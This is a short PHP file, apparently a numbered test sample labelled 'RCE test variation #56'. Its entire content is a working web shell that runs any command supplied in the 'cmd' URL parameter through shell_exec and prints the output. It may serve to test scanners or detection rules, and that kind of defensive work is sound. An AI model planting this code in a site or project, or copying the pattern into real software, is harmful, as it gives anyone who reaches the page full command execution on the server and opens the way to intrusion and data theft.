<?php
// RCE test variation #56
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>